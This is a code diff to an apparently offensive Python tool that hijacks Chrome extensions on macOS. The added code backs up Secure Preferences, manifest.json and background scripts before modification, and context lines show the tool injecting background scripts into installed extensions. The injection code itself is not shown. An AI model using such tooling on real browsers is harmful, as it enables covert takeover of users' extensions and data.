@@ -23,6 +23,7 @@ import hmac
 import json
 import os
 import re
+import shutil
 import subprocess
 import sys
 import time
@@ -103,6 +104,67 @@ def get_device_id():
 def get_chrome_user_data_dir():
     """Get the Chrome user data directory on macOS."""
     return Path.home() / "Library/Application Support/Google/Chrome"
+
+
+def get_backup_dir(extension_id):
+    """Get the backup directory path for the given extension ID."""
+    return Path(f"/tmp/chrome-hijack-backup-{extension_id}")
+
+
+def create_backups(secure_prefs_file, extension_dir, extension_id):
+    """Create backups of files before modification.
+
+    Saves copies of Secure Preferences, manifest.json, and background script
+    to /tmp/chrome-hijack-backup-<extension_id>/<profile_name>/ for later restoration.
+    Each Chrome profile gets its own backup subdirectory.
+    """
+    profile_name = secure_prefs_file.parent.name  # e.g. "Profile 10", "Default"
+    backup_dir = get_backup_dir(extension_id) / profile_name
+    backup_dir.mkdir(parents=True, exist_ok=True)
+
+    # Backup Secure Preferences
+    if secure_prefs_file.exists():
+        shutil.copy2(secure_prefs_file, backup_dir / "Secure Preferences")
+        # Also save the original path so cleanup knows where to restore
+        (backup_dir / "secure_prefs_path.txt").write_text(str(secure_prefs_file))
+        print(f"[+] Backed up Secure Preferences to {backup_dir}")
+
+    # Backup manifest.json
+    manifest_path = extension_dir / "manifest.json"
+    if manifest_path.exists():
+        shutil.copy2(manifest_path, backup_dir / "manifest.json")
+        print(f"[+] Backed up manifest.json to {backup_dir}")
+
+    # Backup background script
+    if manifest_path.exists():
+        try:
+            with open(manifest_path, "r", encoding="utf-8") as f:
+                manifest = json.load(f)
+            bg_script_path = None
+            if "background" in manifest:
+                if "service_worker" in manifest["background"]:
+                    bg_script_path = (
+                        extension_dir / manifest["background"]["service_worker"]
+                    )
+                elif (
+                    "scripts" in manifest["background"]
+                    and len(manifest["background"]["scripts"]) > 0
+                ):
+                    bg_script_path = (
+                        extension_dir / manifest["background"]["scripts"][0]
+                    )
+            if bg_script_path and bg_script_path.exists():
+                shutil.copy2(bg_script_path, backup_dir / "background_script.js")
+                (backup_dir / "background_script_path.txt").write_text(
+                    str(bg_script_path)
+                )
+                print(f"[+] Backed up background script to {backup_dir}")
+        except (json.JSONDecodeError, KeyError) as e:
+            print(f"[!] Warning: Could not backup background script: {e}")
+
+    # Save extension directory path for cleanup
+    (backup_dir / "extension_dir_path.txt").write_text(str(extension_dir))
+    print(f"[+] All backups saved to {backup_dir}")
 
 
 def find_secure_preferences_files(extension_id):
@@ -731,6 +793,9 @@ def modify_chrome_files(extension_id, device_id, args):
     success_count = 0
     for secure_prefs_file, extension_dir in found_files:
         print(f"\n[*] Processing: {secure_prefs_file}")
+
+        # Create backups before any modifications
+        create_backups(secure_prefs_file, extension_dir, extension_id)
 
         # Modify the extension
         if not create_background_script(extension_dir, args):
